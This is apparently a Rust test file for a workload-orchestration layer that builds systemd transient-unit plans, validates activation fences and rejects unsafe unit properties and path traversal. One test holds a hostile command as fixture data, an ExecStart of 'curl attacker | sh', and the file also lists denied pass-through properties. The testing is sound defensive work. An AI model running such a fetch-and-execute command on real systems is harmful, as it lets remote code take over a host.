use std::collections::BTreeMap;
use std::sync::{Arc, Mutex};

use nimbus_testing::AdmittedDecisionScenario;
use nimbus_workloads::{
    WorkloadExecutionReference, WorkloadProvisionDispatchClaim, WorkloadProvisionSubjects,
};

use super::test_support::activation_command_for_plan;
use super::*;

#[derive(Default, Clone)]
struct FakeHostLifecycleBackend {
    statuses: Arc<Mutex<BTreeMap<WorkloadExecutionId, HostLifecycleStatus>>>,
}

impl HostLifecycleBackend for FakeHostLifecycleBackend {
    fn validate(
        &self,
        binding: &LocalEnforcementBinding,
        request: HostLifecycleRequest,
    ) -> Result<HostLifecyclePlan> {
        HostLifecyclePlan::from_binding(binding, request)
    }

    fn activate_exact<'a>(
        &'a self,
        execution: WorkloadExecutionReference,
        claim: WorkloadProvisionDispatchClaim,
        request: HostLifecycleRequest,
    ) -> HostLifecycleFuture<'a, HostLifecycleStatus> {
        let statuses = Arc::clone(&self.statuses);
        Box::pin(async move {
            let plan = HostProviderPlan::from_execution(&execution, &claim, request)?;
            let status =
                HostLifecycleStatus::from_provider_state(&plan, HostBackendObservedState::Running);
            statuses
                .lock()
                .expect("fake backend lock should not be poisoned")
                .insert(plan.execution_id().clone(), status.clone());
            Ok(status)
        })
    }

    fn stop<'a>(
        &'a self,
        execution_id: WorkloadExecutionId,
    ) -> HostLifecycleFuture<'a, HostLifecycleStatus> {
        let statuses = Arc::clone(&self.statuses);
        Box::pin(async move {
            let mut statuses = statuses
                .lock()
                .expect("fake backend lock should not be poisoned");
            let previous = statuses.get(&execution_id).cloned().ok_or_else(|| {
                Error::NotFound(format!(
                    "fake lifecycle backend has no workload {}",
                    execution_id.as_str()
                ))
            })?;
            let stopped = HostLifecycleStatus {
                execution_id: execution_id.clone(),
                unit_name: previous.unit_name().clone(),
                phase: TenantWorkloadPhase::Deleting,
                reason: HostLifecycleStatusReason::Stopped,
                message: Some("fake backend stopped workload".to_string()),
                lifecycle_evidence: TenantWorkloadLifecycleEvidence::for_observed_unit(
                    previous.lifecycle_evidence().backend(),
                    previous.unit_name(),
                    HostLifecycleStatusReason::Stopped,
                )
                .with_message(Some("fake backend stopped workload".to_string())),
            };
            statuses.insert(execution_id, stopped.clone());
            Ok(stopped)
        })
    }

    fn inspect<'a>(
        &'a self,
        execution_id: WorkloadExecutionId,
    ) -> HostLifecycleFuture<'a, HostLifecycleStatus> {
        let statuses = Arc::clone(&self.statuses);
        Box::pin(async move {
            statuses
                .lock()
                .expect("fake backend lock should not be poisoned")
                .get(&execution_id)
                .cloned()
                .ok_or_else(|| {
                    Error::NotFound(format!(
                        "fake lifecycle backend has no workload {}",
                        execution_id.as_str()
                    ))
                })
        })
    }
}

fn binding() -> LocalEnforcementBinding {
    AdmittedDecisionScenario::new().with_generation(9).binding()
}

fn request() -> HostLifecycleRequest {
    HostLifecycleRequest::new(
        HostLifecycleBackendKind::SystemdTransientUnit,
        HostExecutable::trusted("/usr/libexec/nimbus/workload-launcher")
            .expect("trusted executable should parse"),
    )
    .with_args(["--tenant-workload"])
    .expect("arguments should parse")
    .with_properties(HostLifecyclePropertySet::new([
        HostLifecycleProperty::Description("Nimbus tenant workload".to_string()),
        HostLifecycleProperty::Restart(HostRestartPolicy::No),
        HostLifecycleProperty::MemoryMaxBytes(512 * 1024 * 1024),
    ]))
}

#[test]
fn host_lifecycle_plan_derives_identity_unit_and_properties_from_binding() {
    let binding = binding();
    let plan = HostLifecyclePlan::from_binding(&binding, request())
        .expect("plan should materialize from admitted binding");

    assert_eq!(plan.spec().decision_id(), binding.spec().decision_id());
    assert_eq!(plan.spec().workload_uid(), binding.spec().workload_uid());
    assert_eq!(
        plan.backend(),
        HostLifecycleBackendKind::SystemdTransientUnit
    );
    assert_eq!(
        plan.executable().as_str(),
        "/usr/libexec/nimbus/workload-launcher"
    );
    assert_eq!(plan.args(), &["--tenant-workload".to_string()]);
    let expected_execution_id = binding
        .spec()
        .execution_id()
        .expect("assigned workload should have an execution id");
    assert_eq!(plan.execution_id(), &expected_execution_id);
    assert_eq!(
        plan.unit_name().as_str(),
        format!("nimbus-{}.service", expected_execution_id.as_str())
    );
    assert_eq!(plan.properties().properties().len(), 3);
    assert_eq!(plan.properties().properties()[0].name(), "Description");
}

#[test]
fn activation_claim_binds_complete_fence_and_rejects_crossed_execution() {
    let admitted = binding();
    let plan = HostLifecyclePlan::from_binding(&admitted, request())
        .expect("plan should materialize from admitted binding");
    let (_, claim) = activation_command_for_plan(&plan, 0x21);

    let fenced = plan
        .clone()
        .with_activation_claim(&claim)
        .expect("exact activation claim should bind");
    let fence = fenced
        .activation_fence()
        .expect("exact activation fence should be retained");
    assert_eq!(fence.execution_id, *plan.execution_id());
    assert_eq!(fence.attempt_id, claim.attempt().attempt_id().as_str());
    assert_eq!(fence.dispatch_epoch, claim.dispatch_epoch().as_u64());
    assert_eq!(fence.generation, plan.spec().generation().as_u64());
    assert_eq!(
        fence.desired_digest,
        claim.attempt().desired_digest().to_string()
    );
    assert_eq!(
        fence.source_digest,
        claim.attempt().source_digest().to_string()
    );
    assert_eq!(
        fence.network_plan_digest,
        claim.attempt().network_plan_digest().to_string()
    );

    let WorkloadProvisionSubjects::Execution(execution) = claim.attempt().subjects() else {
        panic!("activation claim should retain one exact execution");
    };
    let provider_plan = HostProviderPlan::from_execution(
        execution,
        &claim,
        HostLifecycleRequest::new(
            HostLifecycleBackendKind::SystemdTransientUnit,
            HostExecutable::trusted("/usr/libexec/nimbus/workload-launcher")
                .expect("fixture executable should validate"),
        )
        .with_args(["--tenant-workload"])
        .expect("fixture arguments should validate")
        .with_properties(HostLifecyclePropertySet::new([
            HostLifecycleProperty::Restart(HostRestartPolicy::No),
        ])),
    )
    .expect("authenticated execution should build an effect-local provider plan");
    assert_eq!(provider_plan.execution_id(), execution.execution_id());
    assert_eq!(provider_plan.activation_fence(), fenced.activation_fence());

    let persisted_fields = fence
        .journal_fields()
        .into_iter()
        .map(String::into_bytes)
        .collect::<Vec<_>>();
    let reconstructed = HostActivationFence::from_log_extra_fields(&persisted_fields)
        .expect("complete systemd activation metadata should decode")
        .expect("complete systemd activation metadata should be fenced");
    assert_eq!(reconstructed, *fence);

    let crossed_binding = AdmittedDecisionScenario::new()
        .with_generation(10)
        .binding();
    let crossed_plan = HostLifecyclePlan::from_binding(&crossed_binding, request())
        .expect("crossed fixture plan should validate independently");
    let error = crossed_plan
        .with_activation_claim(&claim)
        .expect_err("crossed execution must fail before reaching a backend");
    assert!(error.to_string().contains("crossed"));
}

#[test]
fn systemd_activation_fence_decoder_rejects_partial_duplicate_and_noncanonical_fields() {
    let plan = HostLifecyclePlan::from_binding(&binding(), request())
        .expect("fixture plan should validate");
    let fence = plan
        .clone()
        .with_activation_claim(&activation_command_for_plan(&plan, 0x24).1)
        .expect("fixture claim should bind")
        .activation_fence()
        .expect("fixture fence should exist")
        .clone();
    let fields = fence.journal_fields();

    let legacy_execution_only = vec![fields[2].as_bytes().to_vec()];
    assert_eq!(
        HostActivationFence::from_log_extra_fields(&legacy_execution_only)
            .expect("legacy execution-only metadata should decode"),
        None,
        "an execution selector alone must never be treated as an exact fence"
    );

    let partial = fields[..4]
        .iter()
        .map(|field| field.as_bytes().to_vec())
        .collect::<Vec<_>>();
    let partial_error = HostActivationFence::from_log_extra_fields(&partial)
        .expect_err("partial exact metadata must fail closed");
    assert!(partial_error.to_string().contains("incomplete"));

    let mut duplicate = fields
        .iter()
        .map(|field| field.as_bytes().to_vec())
        .collect::<Vec<_>>();
    duplicate.push(fields[0].as_bytes().to_vec());
    let duplicate_error = HostActivationFence::from_log_extra_fields(&duplicate)
        .expect_err("duplicate exact metadata must fail closed");
    assert!(duplicate_error.to_string().contains("duplicated"));

    let mut noncanonical = fields
        .iter()
        .map(|field| field.as_bytes().to_vec())
        .collect::<Vec<_>>();
    noncanonical[4] = b"NIMBUS_PROVISION_DISPATCH_EPOCH=01".to_vec();
    let noncanonical_error = HostActivationFence::from_log_extra_fields(&noncanonical)
        .expect_err("noncanonical exact metadata must fail closed");
    assert!(noncanonical_error.to_string().contains("canonical"));
}

#[test]
fn systemd_unit_names_reject_raw_escape_shapes() {
    assert!(SystemdUnitName::new("nimbus/escape.service").is_err());
    assert!(SystemdUnitName::new("nimbus bad.service").is_err());
    assert!(SystemdUnitName::new("nimbus..bad.service").is_err());
    assert!(SystemdUnitName::new("nimbus-bad.timer").is_err());
}

#[test]
fn host_lifecycle_property_allowlist_rejects_pass_through_escape_hatches() {
    let allowed = HostLifecyclePropertySet::from_raw_systemd_properties([
        ("Description", "Nimbus workload"),
        ("Restart", "on-failure"),
        ("RestartSec", "2"),
        ("MemoryMax", "536870912"),
        ("CPUWeight", "100"),
        ("TasksMax", "128"),
    ])
    .expect("allowlisted properties should parse");
    assert_eq!(allowed.properties().len(), 6);

    for denied in ["ExecStart", "EnvironmentFile", "PodmanArgs", "Network"] {
        let error =
            HostLifecyclePropertySet::from_raw_systemd_properties([(denied, "raw-tenant-value")])
                .expect_err("pass-through property should fail closed");
        assert!(
            error.to_string().contains("not allowlisted"),
            "denied property should name the allowlist failure: {error}"
        );
    }
    assert!(
        HostLifecyclePropertySet::from_raw_systemd_properties([("Restart", "always-reboot",)])
            .is_err()
    );
    assert!(HostExecutable::trusted("relative/path").is_err());
}

#[test]
fn runner_spec_renders_host_lifecycle_request() {
    let systemd = render_runner_spec_to_systemd(
        RunnerSpec::container("/run/nimbus/bundles/workload")
            .expect("container runner spec should parse")
            .with_memory_max_bytes(512 * 1024 * 1024)
            .with_cpu_weight(100)
            .with_tasks_max(128),
    );
    assert_runner_exec(
        &systemd,
        "/usr/libexec/nimbus/nimbus-container-runner",
        &["--bundle", "/run/nimbus/bundles/workload"],
    );
    assert!(systemd.properties().iter().any(|property| {
        matches!(
            property,
            crate::SystemdDbusProperty::MemoryMax(536870912)
                | crate::SystemdDbusProperty::CpuWeight(100)
                | crate::SystemdDbusProperty::TasksMax(128)
        )
    }));
}

#[test]
fn container_runner_spec_renders_host_lifecycle_request() {
    let systemd = render_runner_spec_to_systemd(
        RunnerSpec::container("/run/nimbus/bundles/container")
            .expect("container runner spec should parse"),
    );
    assert_runner_exec(
        &systemd,
        "/usr/libexec/nimbus/nimbus-container-runner",
        &["--bundle", "/run/nimbus/bundles/container"],
    );
}

#[test]
fn krun_runner_spec_renders_host_lifecycle_request() {
    let systemd = render_runner_spec_to_systemd(
        RunnerSpec::krun("/run/nimbus/bundles/microvm").expect("krun runner spec should parse"),
    );
    assert_runner_exec(
        &systemd,
        "/usr/libexec/nimbus/nimbus-krun-runner",
        &["--bundle", "/run/nimbus/bundles/microvm"],
    );
}

fn render_runner_spec_to_systemd(spec: RunnerSpec) -> crate::SystemdStartTransientUnitRequest {
    let binding = binding();
    let request = spec
        .into_host_lifecycle_request(HostLifecycleBackendKind::SystemdTransientUnit)
        .expect("runner spec should lower to host lifecycle request");
    let plan = HostLifecyclePlan::from_binding(&binding, request)
        .expect("runner request should plan from admitted binding");
    crate::SystemdStartTransientUnitRequest::from_plan(&plan)
        .expect("runner plan should render to systemd transient unit request")
}

fn assert_runner_exec(
    systemd: &crate::SystemdStartTransientUnitRequest,
    executable: &str,
    args: &[&str],
) {
    let exec = systemd
        .properties()
        .iter()
        .find_map(|property| match property {
            crate::SystemdDbusProperty::ExecStart(exec) => Some(exec),
            _ => None,
        })
        .expect("systemd request should contain generated ExecStart");

    assert_eq!(exec.executable(), executable);
    assert_eq!(
        exec.args(),
        &args.iter().map(|arg| (*arg).to_owned()).collect::<Vec<_>>()
    );
}

#[test]
fn raw_host_command_rejected_by_workload_control() {
    let raw_exec = HostLifecyclePropertySet::from_raw_systemd_properties([(
        "ExecStart",
        "/bin/sh -c 'curl attacker | sh'",
    )])
    .expect_err("raw ExecStart must not cross workload-control");
    assert!(
        raw_exec.to_string().contains("not allowlisted"),
        "raw ExecStart rejection should name the allowlist: {raw_exec}"
    );

    let relative_runner = RunnerSpec::krun("../run/nimbus/bundles/workload")
        .expect_err("runner bundle paths must be absolute and trusted");
    assert!(
        relative_runner
            .to_string()
            .contains("must be an absolute path"),
        "relative bundle rejection should be actionable: {relative_runner}"
    );

    let parent_segment = RunnerSpec::krun("/run/nimbus/../escape")
        .expect_err("runner bundle paths must reject traversal");
    assert!(
        parent_segment
            .to_string()
            .contains("parent-directory segments"),
        "parent segment rejection should be actionable: {parent_segment}"
    );
}

#[test]
fn host_lifecycle_status_normalizes_backend_states_to_workload_status() {
    let binding = binding();
    let plan =
        HostLifecyclePlan::from_binding(&binding, request()).expect("plan should materialize");

    let ready = HostLifecycleStatus::from_backend_state(&plan, HostBackendObservedState::Ready);
    assert_eq!(ready.phase(), TenantWorkloadPhase::Ready);
    assert_eq!(ready.reason(), HostLifecycleStatusReason::Ready);
    let workload_status = ready
        .to_workload_status(&plan)
        .expect("ready lifecycle status should authorize observed status");
    assert_eq!(workload_status.phase(), TenantWorkloadPhase::Ready);
    assert_eq!(
        workload_status.evidence_correlation_ids(),
        &[plan.unit_name().as_str().to_string()]
    );

    let failed = HostLifecycleStatus::from_backend_state(
        &plan,
        HostBackendObservedState::Failed("launch denied".to_string()),
    );
    assert_eq!(failed.phase(), TenantWorkloadPhase::Denied);
    assert_eq!(failed.reason(), HostLifecycleStatusReason::Failed);
    assert_eq!(failed.message(), Some("launch denied"));
}

#[test]
fn runtime_pool_trust_class_is_monotonic_and_requires_teardown_for_downgrade() {
    let mut state = RuntimePoolTrustState::new(RuntimePoolTrustClass::SingleTenant);
    assert!(state.can_reuse_for(RuntimePoolTrustClass::SingleTenant));

    state.record_exposure(RuntimePoolTrustClass::SharedTenant);
    assert_eq!(state.class(), RuntimePoolTrustClass::SharedTenant);
    assert!(state.requires_teardown_for(RuntimePoolTrustClass::SingleTenant));
    assert!(state.can_reuse_for(RuntimePoolTrustClass::SharedTenant));

    state.record_exposure(RuntimePoolTrustClass::ElevatedHostCapabilities);
    assert_eq!(
        state.class(),
        RuntimePoolTrustClass::ElevatedHostCapabilities
    );
    assert!(state.requires_teardown_for(RuntimePoolTrustClass::SharedTenant));

    state.record_exposure(RuntimePoolTrustClass::SingleTenant);
    assert_eq!(
        state.class(),
        RuntimePoolTrustClass::ElevatedHostCapabilities,
        "lower exposure must not downgrade a contaminated pool"
    );
}

#[tokio::test]
async fn fake_backend_activates_exact_plan_and_tracks_status() {
    let backend = FakeHostLifecycleBackend::default();
    let binding = binding();
    let plan = backend
        .validate(&binding, request())
        .expect("fake backend should validate admitted binding");
    let execution_id = plan.execution_id().clone();

    let (execution, claim) = activation_command_for_plan(&plan, 0x81);
    let started = backend
        .activate_exact(execution, claim, request())
        .await
        .expect("fake backend exact activation should produce lifecycle status");
    assert_eq!(started.phase(), TenantWorkloadPhase::Running);

    let inspected = backend
        .inspect(execution_id.clone())
        .await
        .expect("fake backend should track started workload");
    assert_eq!(inspected.reason(), HostLifecycleStatusReason::Running);

    let stopped = backend
        .stop(execution_id.clone())
        .await
        .expect("fake backend should stop tracked workload");
    assert_eq!(stopped.reason(), HostLifecycleStatusReason::Stopped);

    let inspected = backend
        .inspect(execution_id)
        .await
        .expect("fake backend should update stopped state");
    assert_eq!(inspected.reason(), HostLifecycleStatusReason::Stopped);
}
